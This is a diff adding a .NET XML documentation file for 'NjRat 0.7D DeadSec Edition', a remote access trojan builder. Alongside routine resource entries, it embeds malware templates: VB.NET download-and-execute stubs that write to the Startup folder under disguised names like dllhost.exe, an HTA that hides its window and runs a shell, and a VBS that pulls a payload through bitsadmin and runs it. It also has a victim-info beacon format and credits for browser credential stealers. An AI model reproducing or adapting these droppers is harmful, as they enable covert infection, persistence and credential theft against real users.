@@ -1,0 +1,345 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+NjRat 0.7D DeadSec Edition
+</name>
+</assembly>
+<members>
+<member name="T:NJRAT.My.Resources.Resources">
+<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.ResourceManager">
+<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.Culture">
+<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources._023">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources._040">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources._1">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources._12">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources._18">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources._200">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources._6">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources._9">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.bass">
+<summary>
+  Looks up a localized resource of type System.IO.UnmanagedMemoryStream similar to System.IO.MemoryStream.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.bullet_arrow_down">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.bullet_arrow_up">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.church">
+<summary>
+  Looks up a localized resource of type System.IO.UnmanagedMemoryStream similar to System.IO.MemoryStream.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.control_pause_blue">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.control_play_blue">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.doorbell">
+<summary>
+  Looks up a localized resource of type System.IO.UnmanagedMemoryStream similar to System.IO.MemoryStream.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.dotNET_Reactor">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.downloader">
+<summary>
+  Looks up a localized string similar to Imports System.IO
+Imports System.Net
+
+Module Module1
+
+    Function FileExists(filename As String) As Boolean
+        Return File.Exists(filename)
+    End Function
+
+    Sub Main()
+        Try
+            &apos; تنزيل الملف إلى مسار بدء التشغيل وتشغيله
+            Dim Funcc As New WebClient
+            Dim downloadUrl As String = &quot;%URL%&quot;
+            Dim startupPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), &quot;Powershell.exe&quot;)
+
+            Funcc.DownloadFil [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.drip">
+<summary>
+  Looks up a localized resource of type System.IO.UnmanagedMemoryStream similar to System.IO.MemoryStream.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.ghost">
+<summary>
+  Looks up a localized resource of type System.IO.UnmanagedMemoryStream similar to System.IO.MemoryStream.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.hororr">
+<summary>
+  Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.HTA">
+<summary>
+  Looks up a localized string similar to &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+  &lt;head&gt;
+    &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot; /&gt;
+    &lt;script language=&quot;VBScript&quot;&gt;
+Window.ReSizeTo 0, 0
+Window.MoveTo -4000, -4000
+set oShell = CreateObject(&quot;WScript.Shell&quot;)
+Dim Str
+Str = &quot;%Path%&quot; &amp; &quot;\%Filename%&quot;
+const DontWaitUntilFinished = false, ShowWindow = 1, DontShowWindow = 0, WaitUntilFinished [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.Icon1">
+<summary>
+  Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.IconGroup32512">
+<summary>
+  Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.inform">
+<summary>
+  Looks up a localized resource of type System.IO.UnmanagedMemoryStream similar to System.IO.MemoryStream.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.JPEG">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.mpress">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.none">
+<summary>
+  Looks up a localized resource of type System.IO.UnmanagedMemoryStream similar to System.IO.MemoryStream.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.notf">
+<summary>
+  Looks up a localized string similar to              {5}
+	  {6}
+PC	: {0}
+USR	: {1}
+OS	: {2}
+CO	: {3}
+VR	: {4}.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.notify">
+<summary>
+  Looks up a localized resource of type System.IO.UnmanagedMemoryStream similar to System.IO.MemoryStream.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.opendoor">
+<summary>
+  Looks up a localized resource of type System.IO.UnmanagedMemoryStream similar to System.IO.MemoryStream.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.PictureBox8_Image">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.Res">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.RHDiscription">
+<summary>
+  Looks up a localized string similar to Imports System.Windows.Forms
+Imports System.Reflection
+
+&lt;Assembly: AssemblyTitle(&quot;*Title*&quot;)&gt; 
+&lt;Assembly: AssemblyDescription(&quot;*Description*&quot;)&gt; 
+&lt;Assembly: AssemblyCompany(&quot;*Company*&quot;)&gt; 
+&lt;Assembly: AssemblyProduct(&quot;*Product*&quot;)&gt; 
+&lt;Assembly: AssemblyCopyright(&quot;*Copyright*&quot;)&gt; 
+&lt;Assembly: AssemblyTrademark(&quot;*Trademark*&quot;)&gt; 
+&lt;Assembly: AssemblyVersion(&quot;*version*&quot;)&gt; 
+&lt;Assembly: AssemblyFileVersion(&quot;*fversion*&quot;)&gt; 
+
+Module X
+    Sub Main()
+    	MessageBox.Show(&quot;&quot;, &quot;&quot;, MessageBoxButtons.OK, MessageBoxIco [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.RichTextBox1">
+<summary>
+  Looks up a localized string similar to 
+Project		: njRat
+Verison		: 0.7d
+Coded By		: njq8
+Moded By	: HumoudMJ
+FireFox Stealer	: DarkSel
+Paltalk Stealer	: pr0t0fag
+Chrome Stealer	: RockingWithTheBest
+Opera Stealer	: Black-Blood, KingCobra
+Icon Changer	: Miharbi
+WinMM.Net	: John Gietzen
+Thnx To		: MaSad ,CoBrAxXx
+Twitter		: https://twitter.com/njq8.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.Rpx">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.Rug_Packing_Reflection">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.screen1">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.screen2">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.screen3">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.screen4">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.screen5">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.small">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.sound">
+<summary>
+  Looks up a localized resource of type System.IO.UnmanagedMemoryStream similar to System.IO.MemoryStream.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.stub">
+<summary>
+  Looks up a localized string similar to Imports System.IO
+Imports System.Net
+
+Module Module1
+
+    Function FileExists(filename As String) As Boolean
+        Return File.Exists(filename)
+    End Function
+
+    Sub Main()
+        Try
+            &apos; تنزيل الملف إلى مسار بدء التشغيل وتشغيله
+            Dim Funcc As New WebClient
+            Dim downloadUrl As String = &quot;%URL%&quot;
+            Dim startupPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), &quot;dllhost.exe&quot;)
+
+            Funcc.DownloadFile(d [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.swords">
+<summary>
+  Looks up a localized resource of type System.IO.UnmanagedMemoryStream similar to System.IO.MemoryStream.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.tumblr_500">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.vbs">
+<summary>
+  Looks up a localized string similar to on error resume next
+dim file
+file = &quot;%Path%&quot; + &quot;\%Filename%&quot;
+CreateObject(&quot;WScript.Shell&quot;).Run &quot;bitsadmin.exe /transfer 8 %URL% &quot; + file,0, true
+CreateObject(&quot;WScript.Shell&quot;).Run file
+.
+</summary>
+</member>
+<member name="P:NJRAT.My.Resources.Resources.victim">
+<summary>
+  Looks up a localized resource of type System.IO.UnmanagedMemoryStream similar to System.IO.MemoryStream.
+</summary>
+</member>
+</members>
+</doc>
